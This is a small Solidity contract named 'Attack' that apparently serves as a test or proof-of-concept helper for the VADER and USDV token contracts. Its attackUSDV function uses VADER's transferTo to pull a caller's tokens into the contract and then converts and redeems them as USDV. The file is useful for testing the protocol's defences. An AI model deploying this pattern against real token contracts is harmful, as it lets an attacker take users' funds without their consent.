// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.3;

// Interfaces
import "./interfaces/iERC20.sol";
import "./interfaces/iVADER.sol";
import "./interfaces/iUSDV.sol";
import "./interfaces/iROUTER.sol";

//======================================VADER=========================================//
contract Attack {
     
    address public VADER;
    address public USDV;

    //=====================================CREATION=========================================//
 
    constructor() {}

    function init(address _vader, address _USDV) public {
        VADER = _vader;
        USDV = _USDV;
    }

    //========================================iERC20=========================================//
    function attackUSDV(uint256 amount) public {
        iERC20(VADER).approve(USDV, amount);
        iERC20(USDV).approve(USDV, amount);
        iERC20(VADER).transferTo(address(this), amount); // get VADER funds
        iUSDV(USDV).convert(amount); // Convert to USDV back to this address
        iUSDV(USDV).redeem(amount); // Burn USDV back to VADER to this address
    }
}
